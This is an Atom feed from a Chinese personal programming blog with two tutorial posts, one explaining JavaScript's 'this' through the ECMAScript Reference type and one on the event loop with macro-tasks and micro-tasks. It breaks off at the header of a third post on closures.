<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>团子的代码作坊</title>
  
  <subtitle>心有猛兽、细嗅蔷薇</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://dangoying.ink/"/>
  <updated>2019-10-08T15:32:12.950Z</updated>
  <id>http://dangoying.ink/</id>
  
  <author>
    <name>Dango</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从ECMAScript规范解读this</title>
    <link href="http://dangoying.ink/%E4%BB%8EECMAScript%E8%A7%84%E8%8C%83%E8%A7%A3%E8%AF%BBthis.html"/>
    <id>http://dangoying.ink/从ECMAScript规范解读this.html</id>
    <published>2019-10-08T14:07:04.000Z</published>
    <updated>2019-10-08T15:32:12.950Z</updated>
    
    <content type="html"><![CDATA[<p>说起JavaScript中的 <code>this</code> ，一直是一个非常让人头痛的东西，我们常会见到相关书籍和文章中用这样一句话来概括 this 的指向。</p><blockquote><p>this 为引用函数当前执行的环境对象。</p></blockquote><p>然而这样的描述却十分的抽象，最近拜读了某位大佬从ECMAScript规范对this的解读，有一种豁然开朗的感觉，本文更像是一篇笔记，里面也包含了一些我对this的理解，供分享学习。</p><a id="more"></a><h2 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h2><blockquote><p>Types are further subclassified into ECMAScript language types and specification types.<br>An ECMAScript language type corresponds to values that are directly manipulated by an ECMAScript programmer using the ECMAScript language. The ECMAScript language types are Undefined, Null, Boolean, String, Number, and Object.<br>A specification type corresponds to meta-values that are used within algorithms to describe the semantics of ECMAScript language constructs and ECMAScript language types. The specification types are Reference, List, Completion, Property Descriptor, Property Identifier, Lexical Environment, and Environment Record.</p></blockquote><p>ECMAScript 的类型分为语言类型和规范类型。<br>ECMAScript 语言类型是开发者直接使用 ECMAScript 可以操作的。其实就是我们常说的Undefined, Null, Boolean, String, Number, 和 Object。<br>而规范类型相当于 meta-values，是用来用算法描述 ECMAScript 语言结构和 ECMAScript 语言类型的。规范类型包括：Reference, List, Completion, Property Descriptor, Property Identifier, Lexical Environment, 和 Environment Record。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Reference 是一个 Specification Type，也就是 “只存在于规范里的抽象类型”。它们是为了更好地描述语言的底层行为逻辑才存在的，但并不存在于实际的 js 代码中。</p><blockquote><p>A Reference is a resolved name binding.<br>A Reference consists of three components, the base value, the referenced name and the Boolean valued strict reference flag.<br>The base value is either undefined, an Object, a Boolean, a String, a Number, or an environment record (10.2.1).<br>A base value of undefined indicates that the reference could not be resolved to a binding. The referenced name is a String.</p></blockquote><p>这段讲述了 Reference 的构成，由三个组成部分，分别是：</p><ul><li>base value：就是属性所在的对象或者就是 EnvironmentRecord，它的值只可能是 undefined, an Object, a Boolean, a String, a Number, or an environment record 其中的一种。</li><li>referenced name：就是属性的名称。</li><li>strict reference</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//示例1</span><br><span class="line">var foo = 1;</span><br><span class="line"></span><br><span class="line">// 对应的Reference是：</span><br><span class="line">var fooReference = &#123;</span><br><span class="line">    base: EnvironmentRecord,</span><br><span class="line">    name: &apos;foo&apos;,</span><br><span class="line">    strict: false</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//示例2</span><br><span class="line">var foo = &#123;</span><br><span class="line">    bar: function () &#123;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.bar(); // foo</span><br><span class="line"></span><br><span class="line">// bar对应的Reference是：</span><br><span class="line">var BarReference = &#123;</span><br><span class="line">    base: foo,</span><br><span class="line">    propertyName: &apos;bar&apos;,</span><br><span class="line">    strict: false</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>规范中还提供了获取 Reference 组成部分的方法，比如 GetBase 和 IsPropertyReference。</p><h3 id="GetBase"><a href="#GetBase" class="headerlink" title="GetBase"></a>GetBase</h3><blockquote><p>GetBase(V). Returns the base value component of the reference V.</p></blockquote><p>返回 reference 的 base value。</p><h3 id="IsPropertyReference"><a href="#IsPropertyReference" class="headerlink" title="IsPropertyReference"></a>IsPropertyReference</h3><blockquote><p>IsPropertyReference(V). Returns true if either the base value is an object or HasPrimitiveBase(V) is true; otherwise returns false.</p></blockquote><p>简单的理解：如果 base value 是一个对象，就返回true。</p><h2 id="GetValue"><a href="#GetValue" class="headerlink" title="GetValue"></a>GetValue</h2><p>GetValue 返回对象属性真正的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var foo = 1;</span><br><span class="line"></span><br><span class="line">var fooReference = &#123;</span><br><span class="line">    base: EnvironmentRecord,</span><br><span class="line">    name: &apos;foo&apos;,</span><br><span class="line">    strict: false</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">GetValue(fooReference) // 1;</span><br></pre></td></tr></table></figure></p><h2 id="MemberExpression"><a href="#MemberExpression" class="headerlink" title="MemberExpression"></a>MemberExpression</h2><ul><li>PrimaryExpression // 原始表达式 可以参见《JavaScript权威指南第四章》</li><li>FunctionExpression    // 函数定义表达式</li><li>MemberExpression [ Expression ] // 属性访问表达式</li><li>MemberExpression . IdentifierName // 属性访问表达式</li><li>new MemberExpression Arguments    // 对象创建表达式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); // MemberExpression 是 foo</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        console.log(this)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo()(); // MemberExpression 是 foo()</span><br><span class="line"></span><br><span class="line">var foo = &#123;</span><br><span class="line">    bar: function () &#123;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo.bar(); // MemberExpression 是 foo.bar</span><br></pre></td></tr></table></figure><p>所以简单理解 MemberExpression 其实就是()左边的部分。</p><h2 id="this-的确定步骤"><a href="#this-的确定步骤" class="headerlink" title="this 的确定步骤"></a>this 的确定步骤</h2><ul><li>计算 MemberExpression 的结果赋值给 ref</li><li>判断 ref 是不是一个 Reference 类型<blockquote><ol><li>如果 ref 是 Reference，并且 IsPropertyReference(ref) 是 true, 那么 this 的值为 GetBase(ref)</li><li>如果 ref 是 Reference，并且 base value 值是 Environment Record, 那么this的值为 ImplicitThisValue(ref)</li><li>如果 ref 不是 Reference，那么 this 的值为 undefined</li></ol></blockquote></li></ul><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">var foo = &#123;</span><br><span class="line">  value: 2,</span><br><span class="line">  bar: function () &#123;</span><br><span class="line">    return this.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//示例1</span><br><span class="line">console.log(foo.bar());</span><br><span class="line">//示例2</span><br><span class="line">console.log((foo.bar)());</span><br><span class="line">//示例3</span><br><span class="line">console.log((foo.bar = foo.bar)());</span><br><span class="line">//示例4</span><br><span class="line">console.log((false || foo.bar)());</span><br><span class="line">//示例5</span><br><span class="line">console.log((foo.bar, foo.bar)());</span><br></pre></td></tr></table></figure><h3 id="foo-bar"><a href="#foo-bar" class="headerlink" title="foo.bar()"></a>foo.bar()</h3><ul><li>判断MemberExpression 计算结果为 foo.bar</li><li><p>foo.bar的Reference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var Reference = &#123;</span><br><span class="line">  base: foo,</span><br><span class="line">  name: &apos;bar&apos;,</span><br><span class="line">  strict: false</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>IsPropertyReference(ref) 是 true</p></li><li>返回GetBase()，为 <code>foo</code></li></ul><h3 id="foo-bar-1"><a href="#foo-bar-1" class="headerlink" title="(foo.bar)()"></a>(foo.bar)()</h3><ul><li>() 并没有对 MemberExpression 进行计算</li><li>判断MemberExpression 计算结果为 foo.bar</li><li><p>foo.bar的Reference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var Reference = &#123;</span><br><span class="line">  base: foo,</span><br><span class="line">  name: &apos;bar&apos;,</span><br><span class="line">  strict: false</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>IsPropertyReference(ref) 是 true</p></li><li>返回GetBase()，为 <code>foo</code></li></ul><h3 id="foo-bar-foo-bar"><a href="#foo-bar-foo-bar" class="headerlink" title="(foo.bar = foo.bar)()"></a>(foo.bar = foo.bar)()</h3><ul><li>关于赋值运算符 <code>=</code> ，使用了 GetValue 进行赋值，所以返回值不为 Reference 类型</li><li>this 为 undefined</li><li>非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象</li></ul><h3 id="false-foo-bar"><a href="#false-foo-bar" class="headerlink" title="(false || foo.bar)()"></a>(false || foo.bar)()</h3><ul><li>关于逻辑运算符，使用了 GetValue 进行求值，所以返回值不为 Reference 类型</li><li>this 为 undefined</li><li>非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象</li></ul><h3 id="foo-bar-foo-bar-1"><a href="#foo-bar-foo-bar-1" class="headerlink" title="(foo.bar, foo.bar)()"></a>(foo.bar, foo.bar)()</h3><ul><li>关于逗号运算符，使用了 GetValue 进行运算，所以返回值不为 Reference 类型</li><li>this 为 undefined</li><li>非严格模式下，this 的值为 undefined 的时候，其值会被隐式转换为全局对象</li></ul><h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">var foo = &#123;</span><br><span class="line">  value: 2,</span><br><span class="line">  bar: function () &#123;</span><br><span class="line">    return this.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//示例1</span><br><span class="line">console.log(foo.bar()); // 2</span><br><span class="line">//示例2</span><br><span class="line">console.log((foo.bar)()); // 2</span><br><span class="line">//示例3</span><br><span class="line">console.log((foo.bar = foo.bar)()); // 1</span><br><span class="line">//示例4</span><br><span class="line">console.log((false || foo.bar)()); // 1</span><br><span class="line">//示例5</span><br><span class="line">console.log((foo.bar, foo.bar)()); // 1</span><br><span class="line">//示例6</span><br></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><ul><li>MemberExpression 是 foo</li><li><p>foo 的 Reference</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var fooReference = &#123;</span><br><span class="line">    base: EnvironmentRecord,</span><br><span class="line">    name: &apos;foo&apos;,</span><br><span class="line">    strict: false</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>base value 是 Environment Record，调用 ImplicitThisValue(ref)</p></li><li>ImplicitThisValue 方法始终返回 undefined。</li></ul><blockquote><p>参考链接：<a href="https://juejin.im/post/590159d8a22b9d0065c2d918" target="_blank" rel="noopener">JavaScript深入系列15篇（冴羽）</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说起JavaScript中的 &lt;code&gt;this&lt;/code&gt; ，一直是一个非常让人头痛的东西，我们常会见到相关书籍和文章中用这样一句话来概括 this 的指向。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;this 为引用函数当前执行的环境对象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然而这样的描述却十分的抽象，最近拜读了某位大佬从ECMAScript规范对this的解读，有一种豁然开朗的感觉，本文更像是一篇笔记，里面也包含了一些我对this的理解，供分享学习。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JS" scheme="http://dangoying.ink/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript执行机制</title>
    <link href="http://dangoying.ink/JavaScript%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6.html"/>
    <id>http://dangoying.ink/JavaScript执行机制.html</id>
    <published>2019-10-07T13:02:34.000Z</published>
    <updated>2019-10-07T13:54:25.314Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>众所周知，JavaScript是一门单线程语言，但这并不意味着JavaScript会逐行执行，因为JS中有诸如 <code>setTimeout</code> , <code>Promise</code> 这类语法的存在，所以JS得执行顺序便变得扑朔迷离起来，本文就从JS的执行机制一起来探究JS的执行顺序。</p></blockquote><a id="more"></a><h2 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h2><p>因为JavaScript时单线程语言，所以JS的任务需要一个个顺序执行。但当我们的页面需要请求文件、图片等耗时较久的操作时，显然一个个执行，将影响页面的渲染和用户体验，所以我们提出了两个概念：<code>同步任务</code> 和 <code>异步任务</code> 。</p><h3 id="同步任务"><a href="#同步任务" class="headerlink" title="同步任务"></a>同步任务</h3><p>定义：如果在函数A返回的时候，调用者就能够得到预期结果(即拿到了预期的返回值或者看到了预期的效果)，那么这个函数就是同步的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;Hi&quot;);</span><br></pre></td></tr></table></figure></p><h3 id="异步任务"><a href="#异步任务" class="headerlink" title="异步任务"></a>异步任务</h3><p>定义：如果在函数A返回的时候，调用者还不能够得到预期结果，而是需要在将来通过一定的手段得到，那么这个函数就是异步的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fs.readFile(&apos;foo.txt&apos;, &apos;utf8&apos;, function(err, data) &#123;</span><br><span class="line">  console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p>在我们了解了同步任务和异步任务后，我们来看看他们具体是如何执行的。<br><img src="../assets/20191007/1.jpg" alt="Alt text"></p><ul><li>同步和异步任务分别进入不同的执行”场所”，同步的进入主线程，异步的进入Event Table并注册函数。</li><li>当指定的事情完成时，Event Table会将这个函数移入Event Queue。</li><li>主线程内的任务执行完毕为空，会去Event Queue读取对应的函数，进入主线程执行。</li><li>上述过程会不断重复，也就是常说的Event Loop(事件循环)。</li></ul><p>js引擎存在monitoring process进程，会持续不断的检查主线程执行栈是否为空，一旦为空，就会去Event Queue那里检查是否有等待被调用的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let data = [];</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url:www.javascript.com,</span><br><span class="line">    data:data,</span><br><span class="line">    success:() =&gt; &#123;</span><br><span class="line">        console.log(&apos;发送成功!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">console.log(&apos;代码执行结束&apos;);</span><br></pre></td></tr></table></figure></p><ul><li>ajax进入Event Table，注册回调函数success。</li><li>执行console.log(‘代码执行结束’)。</li><li>ajax事件完成，回调函数success进入Event Queue。</li><li>主线程从Event Queue读取回调函数success并执行。</li></ul><h2 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h2><p>setTimeout 函数常用于延时执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">    task();</span><br><span class="line">&#125;,3000)</span><br><span class="line">console.log(&apos;执行console&apos;);</span><br><span class="line"></span><br><span class="line">//执行console</span><br><span class="line">//3秒后，执行task()</span><br></pre></td></tr></table></figure></p><p>而有时候，setTimeout 的延时时间会超出我们设定的时间，这是因为JS的同步任务可能占用了大量时间，setTimeout 得等到同步任务执行完毕后才能执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">    task()</span><br><span class="line">&#125;,3000)</span><br><span class="line"></span><br><span class="line">sleep(10000000);</span><br></pre></td></tr></table></figure></p><ul><li>task()进入Event Table并注册,计时开始。</li><li>执行sleep函数，很慢，非常慢，计时仍在继续。</li><li>3秒到了，计时事件timeout完成，task()进入Event Queue，但是sleep也太慢了吧，还没执行完，只好等着。</li><li>sleep终于执行完了，task()终于从Event Queue进入了主线程执行。</li></ul><p>所以由上可知， <code>setTimeout(fn,0)</code> 的含义是指定某个任务在主线程最早可得的空闲时间执行。</p><h2 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval"></a>setInterval</h2><ul><li>setInterval 与 setTimeout 相近，setInterval 会每隔指定的时间将注册的函数置入Event Queue，如果前面的任务耗时太久，同样需要等待。</li><li>对于setInterval(fn,ms)来说，我们已经知道不是每过ms秒会执行一次fn，而是每过ms秒，会有fn进入Event Queue。一旦setInterval的回调函数fn执行时间超过了延迟时间ms，那么就完全看不出来有时间间隔了。</li></ul><h2 id="process-nextTick-callback"><a href="#process-nextTick-callback" class="headerlink" title="process.nextTick(callback)"></a>process.nextTick(callback)</h2><p>process.nextTick(callback)类似node.js版的”setTimeout”，在事件循环的下一次循环中调用 callback 回调函数。</p><h2 id="宏任务和微任务"><a href="#宏任务和微任务" class="headerlink" title="宏任务和微任务"></a>宏任务和微任务</h2><p>除了广义的同步任务和异步任务，我们对任务有更精细的定义：</p><ul><li>macro-task(宏任务)：包括整体代码script，setTimeout，setInterval</li><li>micro-task(微任务)：Promise，process.nextTick</li></ul><p>不同类型的任务会进入对应的Event Queue，比如setTimeout和setInterval会进入相同的Event Queue。</p><p>事件循环的顺序，决定js代码的执行顺序。进入整体代码(宏任务)后，开始第一次循环。接着执行所有的微任务。然后再次从宏任务开始，找到其中一个任务队列执行完毕，再执行所有的微任务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">    console.log(&apos;promise&apos;);</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">    console.log(&apos;then&apos;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">console.log(&apos;console&apos;);</span><br></pre></td></tr></table></figure><ul><li>这段代码作为宏任务，进入主线程。</li><li>先遇到setTimeout，那么将其回调函数注册后分发到宏任务Event Queue。(注册过程与上同，下文不再描述)</li><li>接下来遇到了Promise，new Promise立即执行，then函数分发到微任务Event Queue。</li><li>遇到console.log()，立即执行。</li><li>整体代码script作为第一个宏任务执行结束，看看有哪些微任务？我们发现了then在微任务Event Queue里面，执行。</li><li>第一轮事件循环结束了，我们开始第二轮循环，当然要从宏任务Event Queue开始。我们发现了宏任务Event Queue中setTimeout对应的回调函数，立即执行。</li><li>结束。</li></ul><p><img src="../assets/20191007/2.jpg" alt="Alt text"></p><h2 id="复杂案例"><a href="#复杂案例" class="headerlink" title="复杂案例"></a>复杂案例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">console.log(&apos;1&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;2&apos;);</span><br><span class="line">    process.nextTick(function() &#123;</span><br><span class="line">        console.log(&apos;3&apos;);</span><br><span class="line">    &#125;)</span><br><span class="line">    new Promise(function(resolve) &#123;</span><br><span class="line">        console.log(&apos;4&apos;);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;).then(function() &#123;</span><br><span class="line">        console.log(&apos;5&apos;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">process.nextTick(function() &#123;</span><br><span class="line">    console.log(&apos;6&apos;);</span><br><span class="line">&#125;)</span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">    console.log(&apos;7&apos;);</span><br><span class="line">    resolve();</span><br><span class="line">&#125;).then(function() &#123;</span><br><span class="line">    console.log(&apos;8&apos;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;9&apos;);</span><br><span class="line">    process.nextTick(function() &#123;</span><br><span class="line">        console.log(&apos;10&apos;);</span><br><span class="line">    &#125;)</span><br><span class="line">    new Promise(function(resolve) &#123;</span><br><span class="line">        console.log(&apos;11&apos;);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;).then(function() &#123;</span><br><span class="line">        console.log(&apos;12&apos;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>第一轮事件循环流程分析如下：</p><ul><li>整体script作为第一个宏任务进入主线程，遇到console.log，输出1。</li><li>遇到setTimeout，其回调函数被分发到宏任务Event Queue中。我们暂且记为setTimeout1。</li><li>遇到process.nextTick()，其回调函数被分发到微任务Event Queue中。我们记为process1。</li><li>遇到Promise，new Promise直接执行，输出7。then被分发到微任务Event Queue中。我们记为then1。</li><li>又遇到了setTimeout，其回调函数被分发到宏任务Event Queue中，我们记为setTimeout2。</li></ul><table><thead><tr><th style="text-align:center">宏任务Event Queue</th><th style="text-align:center">微任务Event Queue</th></tr></thead><tbody><tr><td style="text-align:center">setTimeout1</td><td style="text-align:center">process1</td></tr><tr><td style="text-align:center">setTimeout2</td><td style="text-align:center">then1</td></tr></tbody></table><ul><li>上表是第一轮事件循环宏任务结束时各Event Queue的情况，此时已经输出了1和7。</li><li>我们发现了process1和then1两个微任务。</li><li>执行process1,输出6。</li><li>执行then1，输出8。</li></ul><p>第二轮时间循环从setTimeout1宏任务开始：</p><ul><li>首先输出2。接下来遇到了process.nextTick()，同样将其分发到微任务Event Queue中，记为process2。new Promise立即执行输出4，then也分发到微任务Event Queue中，记为then2。</li></ul><table><thead><tr><th style="text-align:center">宏任务Event Queue</th><th style="text-align:center">微任务Event Queue</th></tr></thead><tbody><tr><td style="text-align:center">setTimeout2</td><td style="text-align:center">process2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">then2</td></tr></tbody></table><ul><li>第二轮事件循环宏任务结束，我们发现有process2和then2两个微任务可以执行。</li><li>输出3。</li><li>输出5。</li><li>第二轮事件循环结束，第二轮输出2，4，3，5。</li></ul><p>第三轮事件循环开始，此时只剩setTimeout2了，执行。</p><ul><li>直接输出9。</li><li>将process.nextTick()分发到微任务Event Queue中。记为process3。</li><li>直接执行new Promise，输出11。</li><li>将then分发到微任务Event Queue中，记为then3。</li></ul><table><thead><tr><th style="text-align:center">宏任务Event Queue</th><th style="text-align:center">微任务Event Queue</th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center">process3</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">then3</td></tr></tbody></table><ul><li>第三轮事件循环宏任务执行结束，执行两个微任务process3和then3。</li><li>输出10。</li><li>输出12。</li><li>第三轮事件循环结束，第三轮输出9，11，10，12。</li></ul><p>整段代码，共进行了三次事件循环，完整的输出为1，7，6，8，2，4，3，5，9，11，10，12。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是JavaScript的执行机制，最后在强调一下JavaScript的两个基本特征。</p><ul><li>javascript是一门单线程语言</li><li>Event Loop是javascript的执行机制</li></ul><blockquote><p>参考链接：<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">这一次，彻底弄懂 JavaScript 执行机制（ssssyoki）</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;众所周知，JavaScript是一门单线程语言，但这并不意味着JavaScript会逐行执行，因为JS中有诸如 &lt;code&gt;setTimeout&lt;/code&gt; , &lt;code&gt;Promise&lt;/code&gt; 这类语法的存在，所以JS得执行顺序便变得扑朔迷离起来，本文就从JS的执行机制一起来探究JS的执行顺序。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JS" scheme="http://dangoying.ink/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>从执行上下文深入理解闭包</title>
    <link href="http://dangoying.ink/%E4%BB%8E%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85.html"/>
    <id>http://dangoying.ink/从执行上下文深入理解闭包.html</id>
    <published>2019-09-29T14:23:27.000Z</published>
    <updated>2019-09-29T15:37:06.618Z</updated>
    
